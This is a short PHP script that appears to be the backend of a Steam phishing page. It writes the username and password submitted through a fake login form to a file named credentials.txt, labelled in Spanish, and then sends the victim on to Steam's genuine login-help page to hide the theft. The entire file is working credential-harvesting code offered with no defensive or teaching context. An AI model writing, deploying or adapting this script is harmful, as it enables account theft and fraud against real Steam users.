<?php

file_put_contents("credentials.txt", "[+] Steam -> Usuario: " . $_POST['username'] . " Contraseña: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://help.steampowered.com/en/wizard/HelpWithLoginInfo/');
exit();
?>
